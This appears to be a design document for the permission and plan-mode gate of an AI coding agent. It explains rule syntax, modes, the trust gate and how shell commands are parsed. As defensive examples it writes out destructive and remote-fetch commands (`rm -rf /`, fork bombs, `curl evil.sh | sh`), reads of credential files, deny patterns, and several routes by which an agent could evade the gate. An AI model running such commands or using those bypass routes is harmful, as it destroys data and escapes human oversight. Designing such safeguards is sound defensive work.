# Permissions & Plan Mode

Modeled on Claude Code's system (researched against current docs), simplified where cloning adds no value. Two principles:

1. **Parse, don't prefix-match.** String-prefix matching on bash commands is trivially bypassed by `&& rm -rf`. We decompose commands and evaluate each subcommand.
2. **Deny beats allow, everywhere.** A deny rule from *any* settings scope beats an allow rule from any other scope. Precedence is about rule kind first, file origin second.

## Tools declare their own shape

The engine does not recognise tools by name. Each tool carries a
`PermissionSpec` (`core/permissions.py`) that says how it wants to be gated:

```python
class ReadTool(Tool[ReadInput]):
    permission = PermissionSpec(mutates=False, target_field="file_path", path_target=True)

class BashTool(Tool[BashInput]):
    permission = PermissionSpec(mutates=True, target_field="command", shell=True)
```

- `mutates` — blocked in plan mode, prompted in ask mode. Read-only tools are
  allowed by default.
- `target_field` — which argument a rule matches against (`edit(src/**)`,
  `bash(npm *)`).
- `path_target` — the target is a path, so the protected-path check applies.
- `shell` — the target is a command line and gets decomposed per subcommand.

**Read-only is not the same as unrestricted.** `read`, `grep` and `glob` all
declare `path_target`, because the protected-path boundary is about *which
files*, not about writing: `grep(output_mode="content")` returns file contents,
so a `grep` that skipped the check would be the way to read `~/.ssh` that `read`
correctly asks about. Any tool whose target is a filesystem path declares
`path_target`, whatever it does with it.

The gate only sees the path a call *names*, so `grep` also skips `.ssh` and
`.env*` while walking a directory — both through ripgrep and through the
pure-Python fallback, which must not disagree about what they will read. A
search that names one of those files still searches it, after the prompt: the
rule is reachable, never incidental.

This is what lets a **plugin** tool get the same protection a built-in one
gets. Previously the engine held name sets (`{"write", "edit", "bash"}`), so a
third-party tool that wrote files was waved through purely because it was not
called `write`. An undeclared tool defaults to *mutating, prompt for it*.

MCP tools declare `mutates=not read_only`, honouring the server's
`annotations.readOnlyHint` and defaulting to prompting when it says nothing.
MCP tools and authored command tools also declare `executes=True`: they run a
program rather than edit a file, so `auto-edit` prompts for them the way it
prompts for a shell command. A command tool with several `path` parameters
has every one of them protected-path checked, not only the one its rules
match on (`Tool.permission_paths`).

## Modes

| Mode | Reads | Edits | Bash/mutating | Use |
|---|---|---|---|---|
| `plan` | ✅ | ❌ blocked | ❌ blocked (read-only cmds ok) | research → plan → approve |
| `ask` (default) | ✅ | prompt | prompt | normal work |
| `auto-edit` | ✅ | ✅ auto (project root only) | prompt, except read-only builtins | trusted editing flow |
| `dontask` | ✅ | rule-matched only, else **auto-deny** | rule-matched only, else auto-deny | never blocks on a prompt |
| `yolo` | ✅ | ✅ | ✅ | bypass; explicit opt-in |

`auto-edit` auto-allows *edits*, and nothing else. An edit is a mutating tool
whose target is a path (`path_target`), which the protected-path check has
already confined to the project; every other mutating tool — `web_fetch`,
`web_search`, a plugin's command tool, an MCP tool that is not read-only —
prompts exactly as in `ask`. (The mode default used to allow all of them.)
A shell command in `auto-edit` takes the same path it takes in `ask`: the
read-only builtins below are allowed, everything else prompts. There is **no allowlist of file-op commands** —
`mkdir`, `touch`, `mv`, `cp` and `rm` all prompt, in every mode but `yolo`.
Earlier versions of this document described such a list; it was never
implemented, and the entry that would carry it does not exist in
`core/permissions.py`. A rule (`bash(mkdir *)`) is the way to get that effect
today.

- **Switching:** the mode pill in the composer opens a menu of all five modes,
  and `/mode <name>` sets one directly. `yolo` is offered only if the session
  started with `--yolo` or settings enable it — the same containment idea as
  Claude Code's bypassPermissions. `dontask` *does* appear in the picker, and is
  also reachable as `--mode dontask` at startup. Mode is per-conversation.
  `permissions.next_mode` implements a `plan → ask → auto-edit (→ yolo)` cycle
  for a `Shift+Tab`-style hotkey, but **nothing calls it**: there is no key
  binding for mode cycling in the frontend.
- **Yolo guardrails:** it has to be armed first — `--yolo` at launch, or the
  Settings → General checkbox, which asks for confirmation and persists as
  `allow_yolo`. Until it is, nothing reaches it: not `/mode`, not a profile
  switch, and not a session opening under a profile, setting or `--mode` that
  asks for it (that one starts in `ask` and says why). The mode pill turns red
  while it is on, and there is a hard
  circuit breaker. Three kinds of command prompt **even
  in yolo**, and this is the whole list (`security/breakers.py`):
  1. a recursive or forced delete (`rm`, `Remove-Item`, `rd /s`, `del /s`) of
     the filesystem root, a drive root, a top-level system directory (`/usr`,
     `/home`, `C:\Windows`…) or a home directory, however spelled — `rm -rf /`,
     `rm -fr /*`, `rm -rf --no-preserve-root /`, `rm -rf -- /`,
     `rm -rf build /`, `rm -rf ~/`, `rm -rf "$HOME"`, `rm -rf ${HOME:?}/`;
  2. a forced `git push` to any remote and branch — `--force`, `-f` in any
     cluster (`-uf`), `--force-with-lease`, `--force-if-includes`, `--mirror`,
     a `+refspec`, with global options in front (`git -C . push -f`) or behind
     a `-c alias.…` or a `-c remote.*.push=+…`;
  3. a fork bomb, whatever its function is called (`:(){ :|:& };:`,
     `f(){ f|f& };f`, `fork while fork`).

  They are matched on the command's words, not on one spelling of it; the
  regexes they replace knew one shape each. A breaker is also matched inside
  the commands another command runs (`$(rm -rf /)`, `bash -c "…"`, `xargs`,
  `find -exec`; see §Bash evaluation pipeline), since those are evaluated as
  if typed. There is
  no breaker for recursive deletes outside the project, and it is not caught in
  yolo any more: the protected-path prompt that used to catch it by a side
  door is not raised in yolo (see the next bullet), so in that mode the
  patterns above are the whole of what stops.
- **Protected paths prompt in every mode except `yolo`**, regardless of allow
  rules: `.git/`,
  `.quickcode/`, `.ssh/`, `.env` and `.env.*`, and anything outside the project
  root. The test runs on the path as *written* and on the path as *resolved*
  (`security/protected.py`), and either is enough: a symlink named `.env` is
  protected by its name, a harmless name that links into `.git` by its target.
  Names are compared the way Windows compares them, on every platform — case
  folded, trailing dots and spaces dropped, an NTFS stream suffix
  (`.env::$DATA`) dropped, 8.3 short names (`GIT~1`) recognised, and `\` taken
  as a separator. Only components *below* the project root count, so a project
  kept under a directory named `.quickcode` is not protected wholesale.
  Checked *before* allow-rule
  evaluation so no rule can accidentally unprotect them, and *after* deny rules,
  so a `read(**.env)` deny denies `.env` rather than turning into a prompt with
  an Allow button on it. Plan mode's refusal of mutating calls also comes first:
  a write to `.git/config` in plan mode is denied, not offered. In `dontask` the same
  check denies instead of prompting, because there is nobody to ask. In `yolo`
  it does neither: the mode exists to stop asking, and asking anyway made a
  plain `find / -name "*x*"` stop and wait — `bash` treats every non-option
  token as a possible path, so the `/` was enough. The gate is entry to the
  mode (arming it, confirming that, a red mode pill), not a second
  conversation per command. Deny rules still deny in yolo, and the
  circuit breakers still prompt. The prompt
  is the ordinary three-button one; there is no "allow self-config edits for
  this session" option, and **Always allow** writes no rule for a protected
  path — the prompt would come back whatever was saved, so it is greyed out
  and says so (§Bash evaluation pipeline).
- **One exception, read-only:** a tool declaring `mutates=False` may *read*
  under `<project>/.quickcode/artifacts/` without the protected-path prompt.
  That directory is where a subagent's oversized report is offloaded
  (`subagents/artifacts.py`), and the parent is told in the same tool result to
  read the file for the rest — so the prompt was for content the session had
  just written itself. The exception is that directory and nothing else:
  `write` and `edit` on the very same path still prompt, `.quickcode/`
  elsewhere still prompts, and `.git/`, `.ssh/` and `.env*` are untouched. The
  path is resolved first, so a symlink or a `..` that leaves the directory is
  protected again. Skipping the prompt is not an allow: the read falls through
  to ordinary rule evaluation, so a `deny` rule covering the file still denies
  it. A shell `cat` of an artifact still prompts — `bash` declares itself
  mutating and the bash pipeline's own scan is unchanged.
- **Subagent capping:** a child agent's mode is `min(parent mode, its definition's cap)`, with the parent's mode read live — a yolo orchestrator does not imply yolo workers, and a parent cycled down to plan caps children already running. Detail in docs/AGENTS.md.
  A child's engine also starts with the session's `deny` and `ask` rules
  (read live, handed down every level), and with none of its `allow` rules: a
  deny holds for the work the orchestrator delegates, and a grant does not
  travel anywhere it was not given. Children used to start with no rules at
  all, so an `auto-edit` or `yolo` child did what the session was denied.
  A child spawned with worktree isolation (docs/AGENTS.md §1.2) has its git
  worktree as its project root. Everything in the spawner's checkout — its
  files, `.git` and `.quickcode` included — is then *outside the project* for
  that child, so it prompts, and a subagent cannot answer the prompt: the
  child can edit its own copy and nothing else. `.git` inside the worktree
  (a file pointing into the main repository's `.git`) is protected by name.
  The exception is the one protected paths always have: a child whose
  effective mode is `yolo` (a yolo session *and* a definition capped at
  `yolo`) is not asked, so isolation does not confine it.

## Rules

Stored as `allow` / `ask` / `deny` arrays. Sources merge; evaluation order is fixed: **deny → (plan mode refuses mutation) → protected-path prompt → ask → allow → mode default**. First match wins — a broad deny beats a narrow allow by design, and beats the protected-path prompt too.

```jsonc
// .quickcode/settings.json
{
  "permissions": {
    "allow": ["bash(uv run pytest**)", "bash(git status)", "edit(src/**)"],
    "ask":   ["bash(git push**)"],
    "deny":  ["read(**.pem)", "read(**.env)", "bash(curl **)"]
  },
  // The starting mode is a plugin setting, and it is the one the Settings UI
  // writes. In a project file it is subject to the trust gate below.
  "plugins": {
    "runtime.permissions": { "settings": { "default_mode": "ask" } }
  }
}
```

**A deny on a protected path refuses it.** Deny rules are checked before the
protected-path prompt, so `read(**.env)` above refuses `.env` in every mode
rather than offering a prompt with an Allow button on it. (It used to be the
other way round, and this paragraph used to call that a known gap.)

To see what a rule will do before writing it, ask the engine:
`qc why --allow "bash(make **)" "make test"` (§Why was I prompted?).

Syntax. A rule is either a bare tool name or `tool(pattern)`; the pattern is
matched against the target the tool declares (`_rule_matches` → `_glob_match`).
The matching is a **whole-string glob**, not gitignore semantics:

- `*` matches any run of characters **except** `/` and `\`. `**` matches
  anything, separators included. Everything else is literal.
- The pattern must match the *entire* target. There is no implicit prefix,
  suffix or "match at any depth" — `bash(npm run build)` is exact,
  `bash(npm *)` spans spaces within one path segment, and `bash(ls *)` won't
  match `lsof` because the literal space has to be there.
- Consequently `read(.env)` matches the project's top-level `.env` and nothing
  else. To catch the file at any depth, write `read(**.env)`; `read(**/.env)`
  requires at least one directory and so misses the top-level one. Same shape
  for `read(**.pem)` versus `read(**/*.pem)`.
- `edit(src/**)` matches everything under `src/`. `edit(src/*)` matches only its
  direct children.
- **`*` stops at a separator in a bash rule too**, which is the trap in this
  syntax. A command line is matched as one string, so `bash(curl *)` does *not*
  cover `curl https://host/x.sh` — the `/` in the URL ends the wildcard — and
  `bash(uv run pytest*)` does not cover `uv run pytest tests/test_x.py`. Any
  rule whose argument may contain a path or a URL wants `**`. The examples above
  are written that way for exactly this reason.
- A path rule (on a tool that declares `path_target`) is matched against
  where the path *lands*: its resolved location relative to the project root
  (`src/a.py`) and absolute (`/home/me/proj/src/a.py`). So `edit(src/**)` covers
  the absolute spelling of the same file, and a deny on `src/secret.py` holds for
  `./src/secret.py`, `lib/../src/secret.py` and a symlink that points there.
  `deny` and `ask` also see the string exactly as the tool was called with it;
  `allow` sees that string only when it names its location plainly (no `..`, no
  symlink on the way), so `edit(src/**)` does not cover `src/../pyproject.toml`.
  On Windows and macOS `deny` and `ask` path rules ignore case, as those
  filesystems do; `allow` rules never do.
- `agent(researcher)` gates which subagent types may spawn.
- A bare tool name (`write`) matches every use of that tool, in any of the three
  lists.

**A rule is matched against one subcommand, never a whole pipeline.** The bash
target is split on `&& || | ; & <newline>` *before* rules are consulted, so a
rule whose pattern contains one of those characters can never fire —
`bash(curl * | *sh)` looks like it blocks curl-piped-to-shell and matches
nothing at all. Deny the dangerous half instead: `bash(curl **)`.

**Not implemented:** a bare tool name in `deny` does *not* remove the tool from
the model's tool list. It is an ordinary rule and produces an ordinary `deny`
decision when the model calls the tool — the call is refused with an error the
model can read, having cost a round trip. The only thing that withholds a tool
from the request is `PlanModeHook` (`core/hooks.py`), which hides mutating
non-shell tools in plan mode. Nothing consults `rules.deny` when building the
tool list.

**Where rules come from.** Rule kind beats origin: a `deny` from anywhere beats
an `allow` from anywhere. Within a kind, all sources are concatenated and the
first match wins. There are exactly two files of `permissions` rules, both
project-scope, read by `Rules.load` in this order:

1. `./.quickcode/settings.json` (shared, checked in)
2. `./.quickcode/settings.local.json` (gitignored by convention, and where
   "always allow" persists)

Every reader of these two files, of `~/.quickcode/settings.json` and of
`config.json` decodes them one way (`quickcode/jsonfile.py`), the trust hash
included: UTF-8 with or without a byte-order mark, or UTF-16 or UTF-32 with one,
which is what Notepad and PowerShell save. Without a mark a file must be UTF-8.
A settings file that does not decode or parse is skipped by every reader alike,
with a warning in the log, and is never saved over: a save from the app is
refused with a 400 that names the file.

Both go through the trust gate below. There is **no user-scope `permissions`
block**: a `permissions` key in `~/.quickcode/config.json` is read by nobody and
silently does nothing. Nor are there CLI flags that carry rules — `--mode` and
`--yolo` set the mode, not the lists.

The one way to carry rules outside a project is a **permission profile**
(`core/profiles.py`): a named `{mode, allow, ask, deny}` bundle under `profiles`
in `~/.quickcode/settings.json` (user) or `./.quickcode/settings.json`
(project), selected by `active_profile`. A profile's lists are *merged over* the
project's rather than replacing them, so a profile narrows by adding `deny`,
never by omitting an `allow`.

## A project's own settings go through the trust gate

Both project settings files are files a repository can commit, so what they may
say on their own is limited. The gate is the one in `security/trust.py` — the
same single grant that decides whether the project's `mcpServers` and
`kind: tool` plugins may run, bound to a hash of that configuration.

| Project-scope config | Untrusted project |
|---|---|
| `permissions.deny`, `permissions.ask` | applied — they only narrow |
| `permissions.allow` | **ignored** |
| `default_mode` (plugin setting or preset) — `plan`, `ask` | applied — they ask for less |
| `default_mode` — `auto-edit`, `dontask`, `yolo` | **ignored** |
| other `runtime.permissions` settings | **ignored** |
| tools, spawns, models, ceilings, prompt text | applied — all of them are intersected downstream and can only narrow |

The rule is one sentence: **a project may make a session more careful without
being asked; making it less careful is a grant, and grants are consented to
once.** Anything ignored falls back to your own configuration, so an untrusted
project opens and works — it just runs on your rules rather than its own.

The fallback is never silent. The trust report names the refused keys
(`GET /api/trust` → `policy`), the session's problem list carries a
`project_settings_ignored` warning naming them and how to change the answer, and
the drop is logged. Trusting the project once applies all of them; editing them
afterwards re-prompts, because the grant is bound to the values.

`settings.local.json` is gated exactly as `settings.json` is. It is gitignored
by convention, and the convention is written in a file the repository also
controls — so "local" says nothing about where the file came from. An "always
allow" answer therefore holds for the rest of the session either way, and
persists across sessions once the project is trusted. When the file cannot be
written — a read-only checkout, a file that does not parse — the call still
runs and the rule holds for this session only, which the log says.

## Bash evaluation pipeline

```
command string
  → split into subcommands on && || | ; & and newlines
  → per subcommand:
      strip harmless wrappers (timeout, time, nice, nohup) and env-var prefixes*
      → deny rules
      → plan mode: anything that is not an auto-allowable read-only builtin
        is denied
      → any argument or option value that may name a protected path, read
        as the shell will read it (.git .quickcode .ssh .env* / outside the
        project), or a recursive read that would reach one on disk
        → ask (deny in dontask)
      → builtin read-only? → auto-allow, if the command word is a bare name
        (or an absolute path outside the project), unless the line carries a
        substitution/redirection marker ($( ` > < or an unquoted `(`) or the
        subcommand carries an env-var prefix
      → ask rules → allow rules → mode default
  → + every command another command runs (bash -c, eval, xargs, find -exec,
      env/sudo/nohup/timeout…, $( ) and backticks, git aliases and exec
      options, rg --pre), evaluated by this same pipeline, 4 levels deep
      (deeper asks)
  → + circuit breakers, matched against the whole line
  → final decision = most restrictive across subcommands
```

The read-only builtins are exactly these seventeen (`READONLY_BUILTINS`):

```
basename  cat  cd  diff  dirname  echo  file  grep  head
ls  pwd  rg  stat  tail  tree  wc  which
```

**`git` is not among them.** Earlier text here promised that "read-only git
forms" auto-allow; no such special case exists and none ever did — `git status`
prompts in `ask` and `auto-edit` like any other command, and is denied in
`plan`. The engine does read git's options now, but only to be stricter (the
config writes, `-c` and friends, and forced pushes below); no git form is
auto-allowed. `bash(git status)` as an allow rule is the supported way to get
there.

- *Env-prefix stripping is for **deny** matching: `FOO=x rm -rf y` still hits a `rm` deny. It does **not** buy the read-only auto-allow, and it does not match an allow rule written against the bare command — `PATH=. ls` is not `ls`, and approving `git status` is not approving `LD_PRELOAD=./x.so git status`. A rule that spells the assignment out still matches.
- Any assignment disqualifies, not a list of dangerous names: such a list would have to be complete, and `PATH`/`LD_PRELOAD` are only the obvious entries next to `BASH_ENV`, `IFS`, `PYTHONSTARTUP`, `NODE_OPTIONS` — and `RIPGREP_CONFIG_PATH`, which points `rg` (a read-only builtin) at a config file that can set `--pre`, which runs a program. The set grows with every program installed on the machine. The cost of the conservative reading is one prompt for `FOO=1 ls`.
- **Words are read the way the shell reads them** (`security/shellwords.py`).
  Every argument is expanded into each string it may become before the
  protected-path test: quotes and backslash escapes removed (`.en''v`,
  `.e\nv`), ANSI-C quoting decoded (`$'\x2eenv'`), braces expanded
  (`{.env,x}`), an option's value split off (`--from-file=.env`, `-f.env`), an
  assignment's right-hand side, a redirection's target (`cat<.env`) and each
  element of a PowerShell array (`x,.env`). A glob counts if it could expand to
  a protected name (`.e?v`, `.en*`, `.*`); one that opens with a wildcard
  (`*`, `*.py`) cannot match a dotfile in bash and is let through, except on
  Windows, where PowerShell and cmd would match `.env` with `*`. A brace
  expansion too large to enumerate is treated as unknown, and unknown asks.
- **Relative paths are relative to where the shell stands.** A lone `cd` persists
  across `bash` calls, and the loop passes that directory to the engine
  (`evaluate_tool(..., cwd=)`). Relative arguments resolve from it, and a shell
  standing outside the project or inside a protected directory treats every
  command as touching a protected path: after an approved `cd ..`, `ls` asks
  and `rm -rf *` is not covered by `bash(rm **)`. It used to resolve everything
  against the project root, so the one approved `cd` carried the rest of the
  session out of the project unprompted. Within one line the same holds for a
  `cd` that names no directory: a bare `cd` goes home and `cd -` goes back, so
  either counts as touching a protected path (`cd && cat .bash_history` used
  to be two read-only builtins, auto-allowed in every mode).
- **A recursive read is gated by what it reaches** (`security/sweep.py`).
  `grep -r KEY .` names `.`, which is not protected, and used to print `.env`
  and `.git/config` on the way through — the sweep the `grep` tool was fixed
  to skip. For `grep -r`/`-R`, `diff -r`, and `rg` with `--hidden`, `-uu`,
  `-.`, `-L` or a whitelist glob (`-g '*'` selects dotfiles even without
  `--hidden`), the engine walks the directories named (the project, if none)
  and treats the command as touching a protected path if the walk would reach
  one; a followed symlink counts by its target. The walk stops at 20,000
  entries and answers yes, since unknown is not safe. Plain `rg`, which skips
  dotfiles by itself, is never walked, and neither is anything in yolo.
- **The auto-allow is for the system's `cat`, not a file called `cat`.**
  `./cat`, `bin/ls` or `tools/grep` is whatever the repository shipped under
  that name, so a command word with a path in it takes the auto-allow only if
  it resolves outside the project (`/bin/cat`). The command word is also tested
  for protected *names* (`.git/hooks/post-checkout`), though not for being
  outside the project, since every program on `PATH` is.
- **An unquoted `(` forfeits the auto-allow.** PowerShell evaluates
  `cat (Remove-Item x)` and `cat x,(Remove-Item y)` before `cat` sees a thing;
  in bash an unquoted `(` inside a command is a syntax error or a
  substitution, so no ordinary command loses anything.
- **A command another command runs is decided as if typed**
  (`security/commands.py`). `find . -exec rm {} +`, `xargs rm`, `env rm`,
  `sudo rm`, `timeout 5 rm`, `bash -c 'rm …'`, `eval rm …`, `echo $(rm …)`,
  `cmd /c`, `powershell -Command` / `-EncodedCommand`, `git -c
  alias.x='!rm …' x`, `git rebase -x`, `git bisect run`, `git submodule
  foreach` and `rg --pre rm` all run `rm`, and `rm` goes through the whole
  pipeline on its own. The most restrictive answer wins, which gives both
  halves of the rule: a deny on `rm` holds whatever it hides behind (in yolo
  that deny is all there is), and an allow on `find` or `xargs` does not
  approve the program they run — `bash(find **)` plus `bash(rm **)` does.
  The wrappers themselves are still not stripped for the allow side, so they
  prompt unless the full string matches a rule. The same goes for commands the
  first split does not cut out: a subshell `(rm …)`, a `case` arm, a `coproc`,
  and a function body (`f() { rm …; }`, `function f { rm …; }`).
- **Deny and ask rules see the words as the shell reads them**, too:
  `bash(rm -rf build)` holds for `rm -rf 'build'` and `r''m -rf build`. A
  command word only the shell can finish — `$CMD`, `rm${IFS}-rf`,
  `$(echo rm)`, `/bin/r?` — may be any command, the denied ones included, so
  when a `bash` deny rule exists it asks (denies in `dontask`) even in yolo.
  Deny rules on commands are still name-based: a copy or link of the binary
  under another name is a different command to them.
- **Builtins that run or write something are not read-only.** `rg --pre` and
  `rg --hostname-bin` run a program, `tree -o` / `tree -R` and `file -C` write
  files; each forfeits the auto-allow (and is denied in plan mode).
- **git pointed at somebody else's program.** An allow rule on git
  (`bash(git **)`, the "Git only" profile) does not cover `git -c <key>=…`,
  `--config-env`, `--exec-path`, `--git-dir`, `--work-tree`, `git -C` into a
  directory holding its own `HEAD`/`config` (a committed bare repository),
  `clone --template` / `clone -c`, or the options that name a command
  (`fetch --upload-pack`, `push --receive-pack`, `difftool -x`, `grep -O`,
  `filter-branch --*-filter`): each points git at code the rule never saw.
  `git config` in a writing form (`git config k v`, `--add`, `--unset`,
  `set`, `--global`…) is treated as a write to a protected path, because
  `.git/config` is where every later git command takes its pager, editor and
  hooks path from. Reads (`--get`, `--list`, `git config k`) are unaffected.
- **"Always allow" saves exactly what was approved** (`PermissionEngine.suggest_rules`). The rules are read off the engine's own evaluation of the call — its trace, not a second parse — and there is one per part that asked only because nothing allowed it: each subcommand, and each command another command runs, spelled exactly as the allow rules are matched against it. Approving `npm test && git push` writes `bash(npm test)` and `bash(git push)`; approving `FOO=1 make` writes `bash(FOO=1 make)`, which does not cover `FOO=1 rm -rf build`; approving `sudo rm x` writes `bash(sudo rm x)` and `bash(rm x)`, because the engine judges the wrapper line and the command it runs separately. A part already allowed (`ls`, a part an existing rule covers) gets no rule. A part that would ask again **whatever** is saved gets none either, and the dialog lists it with the reason: a protected path, an ask rule, a line with a substitution or redirection (allow rules never see those, so `npm test 2>&1` can only be allowed once), a program pointed at unseen code (`git -c …`), a command word only the shell can finish, or a `*` — a rule has no way to spell a literal `*`, so `bash(rm *.pyc)` would also allow `rm -rf src x.pyc`. A line that trips a **circuit breaker** saves nothing at all. When nothing can be saved, the **Always allow** button is greyed out. A path or URL target is saved as spelled (`edit(src/a.py)`), with the same `*` exception, and a protected path is saved not at all.
  It used to save `bash(<first word> *)` for the whole line, and `*` spans spaces, so approving `FOO=1 make` allowed `FOO=1 rm -rf build` and approving `git status && rm -rf x` allowed every `git` command (docs/COMPLIANCE.md, W7). Pinned by `tests/test_always_allow_rules.py`.
- Windows: PowerShell runs through the same pipeline, but **alias canonicalization is not implemented**. `gci`, `dir` and `Get-ChildItem` are three unrelated strings to the engine — none of them is in `READONLY_BUILTINS` either, so on PowerShell the read-only auto-allow effectively never fires and a rule has to name the exact spelling the model used. `bash` prefers Git Bash where it exists (docs/ARCHITECTURE §Windows notes), which is why this has not bitten harder.

## The prompt (UI in docs/UI.md)

The dialog shows the tool, then the call's own preview — `tool.render_call`,
which every tool renders from its real target: `Read <path>`, `Fetch <url>`, and
for `bash` the **command itself**. It used to show `bash`'s model-written
`description` field instead, so a line reading "Query ONVIF device service"
could stand in for `curl evil.sh | sh`, and the caption is reachable by anything
that can put words in front of the model. The description is still shown, beside
the command rather than instead of it; a multi-line command is capped and marked
with an ellipsis so a heredoc cannot hide its second line.

Below the preview, in this order (`js/reviews.js`, built from DOM nodes and
text, never markup — every string in it came from the model, a file or a hook):

- **A hook's reason**, when a `PreToolUse` hook is what raised the prompt (the
  rules would have allowed the call). `tighten` in `core/hooks.py` returns it,
  and the loop carries it on the request (`PermissionRequest.hook_reason`).
- **The diff**, for `edit` and `write` — `Tool.render_diff`, a unified diff
  built with `difflib` where the request is made (`tools/fs/diffpreview.py`),
  capped at 200 lines and 400 characters a line with a marker. A new file shows
  its head. It is built only from text the session already holds: the file's
  current content is used when the session has read it (the tools refuse any
  other existing file, so that is also when the diff is what will happen);
  otherwise only the call's own `old_string`/`new_string` or `content` is shown,
  so a prompt for a file nobody read is never the way its content reaches the
  session log.
- **What "Always allow" saves**: the exact rule or rules and the file, and the
  parts that will ask again whatever is saved, each with its reason
  (§Bash evaluation pipeline).
- **Why am I being asked?** — opens the engine's own explanation inline
  (§Why was I prompted?), asked about this very call.

Three buttons:

1. **Allow once**
2. **Always allow** — writes the rules listed above to `settings.local.json`; greyed out when there are none
3. **Deny** — the first click reveals a free-text box and the button becomes *Confirm deny*; the text is returned to the model as the tool result (`is_error`), so denial is steering, not a dead end

Answering puts the next queued prompt on screen in the same place, so a
dialog ignores clicks on its buttons for 400 ms after it appears: the second
click of a double-click cannot approve a request nobody has read.

The request on the wire (`permission_request`, also logged) carries
`rule_suggestion` (the rules on one line, as it always has), `rules`, `kept`
(`{part, reason}`), `diff` and `hook_reason`; `permission_resolved` carries
`saved`, the rules that were written.

There are no `y / a / n` keyboard shortcuts on this modal — the buttons are the only way to answer it. Earlier text here promised them; they are **not implemented**.

While an agent waits on a prompt, its pane header and its entry in the workspace sidebar read *Needs approval* with a warning-coloured dot, so a prompt in a pane you are not looking at is never invisible.

## Why was I prompted?

A dry run of the gate: give it a tool call, get back the decision the engine
would make and **which check made it**. Nothing runs, nothing is written, and
no hook is executed. Three ways in, one answer:

- **Help ▸ Hands-on ▸ Permission sandbox** and the **profile editor's
  preview** (Configuration ▸ Permission profiles) ask it on every keystroke
  (debounced) and draw the trace with `js/help/explain.js`.
- **`qc why "<command line>"`**, or `quickcode permissions explain`, prints it
  in a terminal (`quickcode/permission_cli.py`):

  ```
  qc why "npm test && rm -rf build"
  qc why --mode yolo "git push -f origin main"
  qc why --allow "bash(make **)" --deny "bash(make deploy**)" "make test"
  quickcode permissions explain --tool read .env
  quickcode permissions explain --tool edit --input '{"file_path": "src/a.py"}' --json
  ```

  `--allow` / `--ask` / `--deny` add rules for that one question;
  `--no-project-rules` and `--no-profile` leave those layers out; `--mode`
  asks as if the session were in that mode; `--json` prints the payload below.
  It sees what a new session in `--cwd` would see, so an MCP server's tools,
  which exist only once the app has connected to them, are not known to it.
- **`POST /api/permissions/explain`** (and `/api/projects/{pid}/…`),
  `server/permissions_api.py`.
- **"Why am I being asked?"** in the permission prompt, which sends
  `{"conv": …, "review": <req_id>}`: the pending call itself, asked of the
  gate that raised it — the engine of the agent that asked (a subagent's is
  capped and holds none of the session's allow rules) and where its shell
  stood (`permission_posture.for_review`). Nothing else may be combined with
  `review`, and a prompt that is no longer waiting is a 404.

**It is the engine, not a model of it.** The answer comes from
`PermissionEngine.evaluate_tool` — the call the agent loop makes before every
tool — with its `trace=` hook on: each deciding line in `core/permissions.py`
records itself as it returns (`_traced`), so the explanation cannot disagree
with the decision. The engine asked is the one a session opened now would
start with, built from the same calls `manager.open()` makes: starting mode,
`Rules.load`, the active profile merged by `profiles.effective`, the
composition's ceiling, and each tool's `PermissionSpec`
(`core/permission_posture.py`). Given `conv`, it is instead the live engine of
that open conversation, including the "Always allow" answers given during it,
asked from wherever that session's shell stands after its last `cd`.
`core/permission_explain.py` adds only prose and provenance. The Help view
used to answer with a JavaScript port of the engine; it had fallen behind the
engine and is gone.

Request body — the call, in whichever shape is handy, plus options:

| Field | |
|---|---|
| `tool` | the tool's name; defaults to `bash` when `command` is given |
| `input` / `command` / `target` | one of: the call's arguments object; a shell tool's command line; the value of the field the tool declares as its target |
| `mode` | ask as if the session were in this mode (default: the new session's, or the conversation's) |
| `conv` | ask the live gate of this open conversation |
| `rules` | `{"allow": [], "ask": [], "deny": []}` added for this question only, merged the way a profile's rules are; lines the engine could never match come back in `invalid_rules` |
| `project_rules`, `profile` | `false` leaves out the project's settings rules, or the active profile |

The answer: `decision`; `summary`, one sentence for the step that decided;
`decided_by`, that step; `steps`, the whole trace; `suggestion` (only for
`ask`) — `rules`, what "Always allow" would write (`rule` is the same on one
line), `kept`, the parts no rule covers and why, the file, whether it persists
past this session (it does once the project is trusted), and `next_time`, the
engine's answer *with those rules added*: `ask` means they would not stop the
next prompt (a protected path, a circuit breaker, an ask rule), and the text
says which; `hints`, the
allow rules an untrusted project's own files state and the loader ignored,
when trusting it would change the answer; `notes`, for a tool the composition
never gives the agent, a mutating tool plan mode withholds, and PreToolUse
hooks that match the tool — they run after the gate and can only tighten it,
and a dry run does not run them; and `posture`, what was asked (mode and where
it came from, profile, trust).

Each step has a `step` id, a `decision` (`null` for one that looked and did
not decide) and a `why`; a matched rule carries `sources`, the settings file,
profile, what-if or session answer it came from.

| `step` | |
|---|---|
| `deny_rule`, `ask_rule`, `allow_rule` | a rule matched (`rule`, `sources`) |
| `plan_mode` | plan mode refused a mutating tool, or a shell command that is not a read-only builtin |
| `protected_path` | the target (or, in the shell, an argument, where the shell stands, what the command writes, or what a recursive read reaches — `reason`) is protected; `waived` when yolo or the artifacts exemption let it through |
| `read_only` | no rule matched and the tool is read-only |
| `mode_default` | no rule matched; the mode decided |
| `shell`, `parsed`, `subcommand` | how a command line was split and read; each subcommand carries its own `steps` |
| `readonly_builtin` | a read-only builtin ran unprompted — or did not qualify, and why |
| `unresolvable_command` | a command word only the shell can finish, with a `bash` deny rule in place |
| `inner_command`, `nesting_limit` | a command another command runs, judged as its own line (its own `steps`); nested too deep |
| `circuit_breaker`, `most_restrictive` | the line-wide checks and the final fold |

## Plan mode

- Entry: the mode pill, `/mode plan`, or `--mode plan`. (There is no `Shift+Tab` binding and no bare `/plan` command.) The system prompt gains a `<plan_mode>` section: *investigate, don't mutate; produce a plan; call the `plan` tool when ready*.
- Enforcement is **structural, not prompt-based**: in plan mode the mutating tools are withheld from the request's tool list (the model can't call what isn't offered), and the bash pipeline only permits builtin read-only commands.
- It lives in `PlanModeHook` (`core/hooks.py`), not in the loop. The hook hides every tool declaring `mutates` unless it also declares `shell` — a shell tool is only partly mutating and the engine gates it per subcommand — and it intercepts the `plan` call to run the review. Because the rule is written against the declaration rather than against two tool names, a plugin's mutating tool is withheld in plan mode too.
- Exit: the model calls `plan(plan=<markdown>)` → the plan review dialog:
  1. **Approve · auto-edit** — plan accepted, mode drops to `auto-edit` for execution
  2. **Approve · ask mode** — mode drops to `ask`
  3. **Keep planning** — feedback text returns to the model, stays in plan mode
- On approval the plan text is stored on the agent (`AgentInstance.approved_plan`) and the interception tells the model, in its tool result, that the plan was approved and to execute it. That is the whole of it today.
